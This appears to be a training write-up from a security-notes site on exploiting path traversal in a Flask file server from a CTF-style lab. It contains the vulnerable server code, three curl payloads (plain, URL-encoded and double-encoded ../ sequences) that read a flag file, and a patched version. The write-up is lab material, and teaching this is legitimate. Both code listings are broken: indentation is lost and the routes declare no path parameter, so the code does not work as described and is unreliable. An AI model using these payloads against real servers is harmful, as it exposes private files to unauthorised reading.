---
title: Web Security
nav_order: 1
parent: English
---
# Web Security
Notes and practice on web security topics.

A Step-by-Step Guide to Exploiting the Path Traversal Vulnerability

Introduction
Path Traversal is a web application vulnerability that allows an attacker to access files outside of the permitted directory. This example uses a Flask server serving files from the /challenge/files folder. The flaw is that the path is generated directly from user input.

Server code:

Code

```
#!/opt/pwn.college/python
import flask
import os

app = flask.Flask(__name__)

@app.route("/files", methods=["GET"])
@app.route("/files/", methods=["GET"])
def challenge(path="index.html"): 
requested_path = app.root_path + "/files/" + path 
print(f"DEBUG: {requested_path=}") 
try: 
return open(requested_path).read() 
except PermissionError: 
flask.abort(403, requested_path) 
except FileNotFoundError: 
flask.abort(404, f"No {requested_path} from directory {os.getcwd()}") 
except Exception as e:
flask.abort(500, requested_path + ":" + str(e))

app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```
Exploitation:

Since the server simply appends the entered path to the base directory, you can use ../ sequences to go beyond it.

Step 1. Basic bypass:

Code
curl -v 'http://challenge.localhost/files/../../flag'
Step 2. URL encoding:

Code
curl -v 'http://challenge.localhost/files/%2e%2e/%2e%2e/%2e%2e/flag'
Step 3. Double encoding:

Code
curl -v 'http://challenge.localhost/files/%252e%252e/%252e%252e/%252e%252e/flag'
As a result, the server returns the file contents.

Protection
To mitigate the vulnerability, you must normalize the path and ensure it remains within the allowed directory.

Code
```
from pathlib import Path

BASE_DIR = Path(app.root_path) / "files"

@app.route("/files", methods=["GET"])
@app.route("/files/", methods=["GET"])
def challenge(path="index.html"): 
requested_path = (BASE_DIR / path).resolve() 
if not requested_path.is_relative_to(BASE_DIR): 
flask.abort(403, "Access denied") 
try: 
return open(requested_path).read() 
except PermissionError: 
flask.abort(403, "Permission denied") 
except FileNotFoundError: 
flask.abort(404, f"File not found: {requested_path}") 
except Exception as e: 
flask.abort(500, str(e))
```
Conclusion
Path traversal is a dangerous but easily preventable vulnerability. Proper handling of user input and path validation are sufficient to protect your application.
